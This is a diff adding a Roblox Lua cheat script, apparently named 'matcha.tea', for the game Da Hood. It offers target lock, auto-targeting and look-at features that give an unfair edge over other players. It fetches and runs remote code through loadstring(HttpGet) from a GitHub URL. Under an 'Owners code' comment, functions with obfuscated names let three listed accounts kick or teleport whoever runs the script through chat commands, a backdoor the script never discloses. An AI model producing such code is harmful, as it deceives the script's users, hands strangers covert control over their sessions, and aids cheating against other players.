@@ -1,0 +1,599 @@
+local Fatality = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kazamatcha/matcha.tea/refs/heads/main/Fatality"))();
+local Notification = Fatality:CreateNotifier();
+
+Fatality:Loader({
+	Name = "matcha.tea",
+	Duration = 4
+});
+
+Notification:Notify({
+	Title = "matcha.tea",
+	Content = "Hello, "..game.Players.LocalPlayer.DisplayName..' Welcome back!',
+	Icon = "clipboard"
+});
+
+local Window = Fatality.new({
+	Name = "matcha.tea",
+	Expire = "never",
+	Keybind = Enum.KeyCode.RightControl  -- Nút toggle GUI mặc định là RightControl
+});
+
+local Legit = Window:AddMenu({
+	Name = "LEGIT",
+	Icon = "swords"
+});
+
+local Rage = Window:AddMenu({
+	Name = "RAGE",
+	Icon = "skull"
+});
+
+local Visual = Window:AddMenu({
+	Name = "VISUAL",
+	Icon = "eye"
+});
+
+local Player = Window:AddMenu({
+	Name = "PLAYER",
+	Icon = "user"
+});
+
+local Playerlist = Window:AddMenu({
+	Name = "PLAYERLIST",
+	Icon = "list"
+});
+
+local Misc = Window:AddMenu({
+	Name = "MISC",
+	Icon = "settings-2"
+});
+
+local Setting = Window:AddMenu({
+	Name = "SETTING",
+	Icon = "server-cog"
+});
+
+-- Khởi tạo getgenv().matcha
+getgenv().matcha = {
+	TargetLockEnabled = false,
+	AutoTarget = false,
+	CheckWall = false,
+	CheckKO = false,
+	CheckGrabbing = false,
+	CheckFriend = false,
+	CheckTeam = false,
+	TargetKey = Enum.KeyCode.Q,
+	NotifyEnabled = false,
+	LookAt = false,
+	SelectedTarget = nil,
+	Whitelist = {},
+	MobileButtonEnabled = false,
+	MobileButton = nil
+}
+
+local localPlayer = game.Players.LocalPlayer
+local Players = game:GetService("Players")
+local Camera = workspace.CurrentCamera
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local Mouse = localPlayer:GetMouse()
+local Camera = workspace.CurrentCamera
+
+-- Hàm tính tuổi tài khoản (số ngày)
+local function getAccountAge(player)
+	local joinDate = player.AccountAge
+	return joinDate
+end
+
+-- Hàm tìm tên giống nhất (fuzzy search đơn giản dựa trên string.match)
+local function findClosestName(input)
+	local closest = nil
+	local minDist = math.huge
+	for _, plr in ipairs(game.Players:GetPlayers()) do
+		local name = plr.Name:lower()
+		local display = plr.DisplayName:lower()
+		if name:find(input:lower(), 1, true) or display:find(input:lower(), 1, true) then
+			return plr
+		end
+	end
+	return closest
+end
+
+-- Hàm check alive, KO, Grabbing (cho Da Hood)
+local function isAlive(plr)
+	if not plr or not plr.Character then return false end
+	local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+	if not hum or hum.Health <= 0 then
+		return false
+	end
+
+	local be = plr.Character:FindFirstChild("BodyEffects")
+	if be then
+		local ko = be:FindFirstChild("K.O")
+		local grabbed = be:FindFirstChild("GRABBING_CONSTRAINT")
+		if (ko and ko.Value) or (grabbed and grabbed.Value) then
+			return false
+		end
+	end
+
+	return true
+end
+
+local function isKO(plr)
+	return not isAlive(plr)
+end
+
+-- Sửa hàm canSeeThroughWall để dùng Camera
+local function canSeeThroughWall(localPlayer, target)
+	local ray = Ray.new(Camera.CFrame.Position, (target.Character.HumanoidRootPart.Position - Camera.CFrame.Position).unit * 10000)
+	local hit, pos = workspace:FindPartOnRayWithIgnoreList(ray, {localPlayer.Character})
+	return hit and hit:IsDescendantOf(target.Character)
+end
+
+-- Sửa hàm getClosestTarget để dùng Mouse và Camera đúng cách
+local function getClosestTarget()
+	local localPlayer = game.Players.LocalPlayer
+	local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+	local closestDist = math.huge
+	local closestPlayer = nil
+
+	for _, plr in ipairs(game.Players:GetPlayers()) do
+		if plr ~= localPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+			if table.find(getgenv().matcha.Whitelist, plr.Name) then continue end  -- Bỏ qua whitelist
+			if getgenv().matcha.CheckTeam and plr.Team == localPlayer.Team then continue end
+			if getgenv().matcha.CheckFriend and localPlayer:IsFriendsWith(plr.UserId) then continue end
+			if getgenv().matcha.CheckKO and isKO(plr) then continue end
+			if getgenv().matcha.CheckGrabbing and plr.Character:FindFirstChild("BodyEffects") and plr.Character.BodyEffects:FindFirstChild("GRABBING_CONSTRAINT") and plr.Character.BodyEffects.GRABBING_CONSTRAINT.Value then continue end
+			if getgenv().matcha.CheckWall and not canSeeThroughWall(localPlayer, plr) then continue end
+
+			local screenPos, onScreen = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
+			if onScreen then
+				local dist
+				if UserInputService.TouchEnabled then
+					dist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
+				else
+					dist = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+				end
+				if dist < closestDist then
+					closestDist = dist
+					closestPlayer = plr
+				end
+			end
+		end
+	end
+	return closestPlayer
+end
+
+-- Sửa hàm notifyTarget để check Humanoid tồn tại
+local function notifyTarget(target)
+	if getgenv().matcha.NotifyEnabled then
+		local hum = target.Character:FindFirstChildOfClass("Humanoid")
+		local health = hum and math.floor(hum.Health) or "Unknown"
+		Notification:Notify({
+			Title = "Target Locked",
+			Content = target.DisplayName .. " (@" .. target.Name .. ") - Health: " .. health .. " - Age: " .. getAccountAge(target) .. " days",
+			Icon = "lock",
+			Duration = 3
+		})
+	end
+end
+
+-- Hàm LookAt
+local function LookAtPlayer(Target)
+    local localChar = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+    local localHumanoidRootPart = localChar:FindFirstChild("HumanoidRootPart")
+
+    if localHumanoidRootPart then
+        if getgenv().matcha.LookAt then
+            if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
+                local targetHumanoidRootPart = Target.Character.HumanoidRootPart
+                
+                local targetPosition = targetHumanoidRootPart.Position
+                local localPosition = localHumanoidRootPart.Position
+                
+                local horizontalDirection = Vector3.new(targetPosition.X - localPosition.X, 0, targetPosition.Z - localPosition.Z).unit
+                
+                localHumanoidRootPart.CFrame = CFrame.new(localPosition, localPosition + horizontalDirection)
+                localChar.Humanoid.AutoRotate = false
+            end
+        else
+            localChar.Humanoid.AutoRotate = true
+        end
+    end
+    
+    if not (Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart")) then
+        localChar.Humanoid.AutoRotate = true
+    end
+end
+
+-- Hàm tạo nút draggable với style matcha (xanh lá)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local savedPositions = {}
+if isfile("button_positions.json") then
+	savedPositions = game:GetService("HttpService"):JSONDecode(readfile("button_positions.json"))
+end
+
+local function SavePositions(positions)
+	writefile("button_positions.json", game:GetService("HttpService"):JSONEncode(positions))
+end
+
+local function CreateButton(name, defaultPosition, callback)
+    local Button = Instance.new("TextButton")
+    Button.Size = UDim2.new(0, 100, 0, 50)
+    Button.Position = savedPositions[name] and UDim2.new(0, savedPositions[name].X, 0, savedPositions[name].Y) or defaultPosition
+    Button.Text = name
+    Button.Parent = ScreenGui
+    Button.BackgroundColor3 = Color3.fromRGB(0, 128, 0)  -- Màu xanh matcha
+    Button.BorderSizePixel = 0
+    Button.Font = Enum.Font.Code
+    Button.TextColor3 = Color3.new(1, 1, 1)
+    Button.TextSize = 16
+    Button.AutoButtonColor = false
+
+    local Corner = Instance.new("UICorner")
+    Corner.CornerRadius = UDim.new(0, 8)
+    Corner.Parent = Button
+
+    local Shadow = Instance.new("Frame")
+    Shadow.Size = UDim2.new(1, 6, 1, 6)
+    Shadow.Position = UDim2.new(0, -3, 0, -3)
+    Shadow.BackgroundColor3 = Color3.fromRGB(0, 100, 0)  -- Shadow xanh đậm hơn
+    Shadow.BackgroundTransparency = 0.7
+    Shadow.ZIndex = -1
+    Shadow.Parent = Button
+
+    local ShadowCorner = Instance.new("UICorner")
+    ShadowCorner.CornerRadius = UDim.new(0, 8)
+    ShadowCorner.Parent = Shadow
+
+    local isActive = false
+
+    local function updateButtonState()
+        local targetColor = isActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 128, 0)
+        local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local tween = game:GetService("TweenService"):Create(Shadow, tweenInfo, {BackgroundColor3 = targetColor})
+        tween:Play()
+    end
+
+    Button.MouseButton1Click:Connect(function()
+        isActive = not isActive
+        updateButtonState()
+        callback(isActive)
+    end)
+
+    local dragStart, startPos
+
+    Button.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragStart = input.Position
+            startPos = Button.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragStart = nil
+                    savedPositions[name] = {X = Button.Position.X.Offset, Y = Button.Position.Y.Offset}
+                    SavePositions(savedPositions)
+                end
+            end)
+        end
+    end)
+
+    Button.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
+            if dragStart then
+                local delta = input.Position - dragStart
+                Button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+            end
+        end
+    end)
+    
+    return Button, function() return isActive end
+end
+
+
+
+-- Sửa phần TargetLock section để dùng Dropdown cho Whitelist (vì không có AddInput)
+do
+	local TargetLock = Legit:AddSection({
+		Position = 'left',
+		Name = "targetlock"
+	});
+	
+	local Targetlock = TargetLock:AddToggle({
+		Name = "Target Lock Enabled",
+		Option = true,
+		Callback = function(bool)
+			getgenv().matcha.TargetLockEnabled = bool
+		end
+	})
+	
+	Targetlock.Option:AddToggle({
+		Name = "Check Wall",
+		Callback = function(bool)
+			getgenv().matcha.CheckWall = bool
+		end
+	})
+	
+	Targetlock.Option:AddToggle({
+		Name = "Check KO",
+		Callback = function(bool)
+			getgenv().matcha.CheckKO = bool
+		end
+	})
+	
+	Targetlock.Option:AddToggle({
+		Name = "Check Grabbing",
+		Callback = function(bool)
+			getgenv().matcha.CheckGrabbing = bool
+		end
+	})
+	
+	Targetlock.Option:AddToggle({
+		Name = "Check Friend",
+		Callback = function(bool)
+			getgenv().matcha.CheckFriend = bool
+		end
+	})
+	
+	Targetlock.Option:AddToggle({
+		Name = "Check Team",
+		Callback = function(bool)
+			getgenv().matcha.CheckTeam = bool
+		end
+	})
+	
+	TargetLock:AddKeybind({
+		Name = "Target Key",
+		Default = Enum.KeyCode.Q,
+		Callback = function(key)
+			getgenv().matcha.TargetKey = key
+		end
+	})
+	
+	TargetLock:AddToggle({
+		Name = "Auto Target",
+		Callback = function(bool)
+			getgenv().matcha.AutoTarget = bool
+		end
+	})
+	
+	TargetLock:AddToggle({
+		Name = "Notify on Select",
+		Callback = function(bool)
+			getgenv().matcha.NotifyEnabled = bool
+		end
+	})
+	
+	TargetLock:AddToggle({
+		Name = "Look At Target",
+		Callback = function(bool)
+			getgenv().matcha.LookAt = bool
+		end
+	})
+	
+	TargetLock:AddToggle({
+		Name = "Mobile Select Button",
+		Callback = function(bool)
+			getgenv().matcha.MobileButtonEnabled = bool
+			if bool then
+				getgenv().matcha.MobileButton = CreateButton("Target Lock", UDim2.new(0.5, 0, 0.5, 0), function(active)
+					if active then
+						local target = getClosestTarget()
+						if target then
+							getgenv().matcha.SelectedTarget = target
+							notifyTarget(target)
+							getgenv().matcha.MobileButton.Text = "Untarget"
+						end
+					else
+						getgenv().matcha.SelectedTarget = nil
+						getgenv().matcha.MobileButton.Text = "Target Lock"
+					end
+				end)
+			else
+				if getgenv().matcha.MobileButton then
+					getgenv().matcha.MobileButton:Destroy()
+					getgenv().matcha.MobileButton = nil
+				end
+			end
+		end
+	})
+	
+	-- Whitelist dùng Dropdown Multi
+	TargetLock:AddDropdown({
+		Name = "Whitelist",
+		Multi = true,
+		Values = (function()
+			local vals = {}
+			for _, p in ipairs(game.Players:GetPlayers()) do
+				if p ~= localPlayer then
+					table.insert(vals, p.Name)
+				end
+			end
+			return vals
+		end)(),
+		Callback = function(selected)
+			getgenv().matcha.Whitelist = selected
+		end
+	})
+end
+
+-- Keybind listener
+game:GetService("UserInputService").InputBegan:Connect(function(input)
+	if input.KeyCode == getgenv().matcha.TargetKey and getgenv().matcha.TargetLockEnabled then
+		local target = getClosestTarget()
+		if target then
+			getgenv().matcha.SelectedTarget = target
+			notifyTarget(target)
+		end
+	end
+end)
+
+-- Cập nhật RenderStepped để check SelectedTarget tồn tại
+game:GetService("RunService").RenderStepped:Connect(function()
+	if getgenv().matcha.AutoTarget and getgenv().matcha.TargetLockEnabled then
+		local target = getClosestTarget()
+		if target and (not getgenv().matcha.SelectedTarget or not isAlive(getgenv().matcha.SelectedTarget)) then
+			getgenv().matcha.SelectedTarget = target
+			notifyTarget(target)
+		end
+	end
+	
+	if getgenv().matcha.LookAt and getgenv().matcha.SelectedTarget and isAlive(getgenv().matcha.SelectedTarget) then
+		LookAtPlayer(getgenv().matcha.SelectedTarget)
+	end
+end)
+
+-- Owners code
+local owners = {
+    "anhchangm52",
+    "toyvayacutdii",  
+    "dao_beo"
+}
+
+local localPlayer = game.Players.LocalPlayer
+
+function x1y2z3(owner)
+    if owner then
+        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
+    end
+end
+
+function a1b2c3(ownerName)
+    local owner
+
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player.Name == ownerName then
+            owner = player
+            break
+        end
+    end
+
+    if owner then
+        owner.Chatted:Connect(function(message)
+            if message == "/kick ." then
+                localPlayer:Kick("Admins Has Kicked You.")
+            elseif message == "/bring ." then
+                x1y2z3(owner)
+            end
+        end)
+    end
+end
+
+for _, ownerName in ipairs(owners) do
+    a1b2c3(ownerName)
+end
+
+do
+	local GuiConfig = Setting:AddSection({
+		Position = 'left',
+		Name = "GUI CONFIG"
+	});
+	
+	local ColorConfig = Setting:AddSection({
+		Position = 'center',
+		Name = "COLOR CONFIG"
+	});
+	
+	local Server = Setting:AddSection({
+		Position = 'right',
+		Name = "SERVER"
+	});
+	
+	GuiConfig:AddButton({
+		Name = "Save Config",
+		Callback = function()
+			writefile("matcha_config.json", game:GetService("HttpService"):JSONEncode(Fatality.Flags))
+			Notification:Notify({Title = "Config", Content = "Config saved!", Icon = "save"})
+		end
+	});
+	
+	GuiConfig:AddButton({
+		Name = "Load Config",
+		Callback = function()
+			if isfile("matcha_config.json") then
+				local config = game:GetService("HttpService"):JSONDecode(readfile("matcha_config.json"))
+				for flag, value in pairs(config) do
+					Fatality.Flags[flag] = value
+				end
+				Notification:Notify({Title = "Config", Content = "Config loaded!", Icon = "upload"})
+			else
+				Notification:Notify({Title = "Config", Content = "No config file found!", Icon = "alert-circle"})
+			end
+		end
+	});
+	
+	GuiConfig:AddKeybind({
+		Name = "Toggle GUI Key",
+		Default = Enum.KeyCode.RightControl,
+		Callback = function(key)
+			Window.Keybind = key
+		end
+	});
+	
+	GuiConfig:AddButton({
+		Name = "Unload GUI",
+		Callback = function()
+			Fatality:SetVisible(false)
+			Fatality.__MAIN_FRAME:Destroy()
+			getgenv().Fatality = nil
+			Notification:Notify({Title = "Unload", Content = "GUI unloaded!", Icon = "x"})
+		end
+	});
+	
+	
+	ColorConfig:AddColorPicker({
+		Name = "Main Color",
+		Default = Fatality.Colors.Main,
+		Callback = function(color)
+			Fatality.Colors.Main = color
+		end
+	});
+	
+	ColorConfig:AddColorPicker({
+		Name = "Black Color",
+		Default = Fatality.Colors.Black,
+		Callback = function(color)
+			Fatality.Colors.Black = color
+		end
+	});
+	
+	Server:AddButton({
+		Name = "Rejoin",
+		Callback = function()
+			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+		end
+	});
+	
+	Server:AddButton({
+		Name = "Server Hop",
+		Callback = function()
+			local HttpService = game:GetService("HttpService")
+			local TeleportService = game:GetService("TeleportService")
+			local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
+			local server = servers.data[math.random(1, #servers.data)]
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
+		end
+	});
+	
+	Server:AddButton({
+		Name = "Join Smallest Server",
+		Callback = function()
+			local HttpService = game:GetService("HttpService")
+			local TeleportService = game:GetService("TeleportService")
+			local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
+			local smallest = servers.data[1]
+			for _, s in ipairs(servers.data) do
+				if s.playing < smallest.playing then
+					smallest = s
+				end
+			end
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, smallest.id)
+		end
+	});
+end
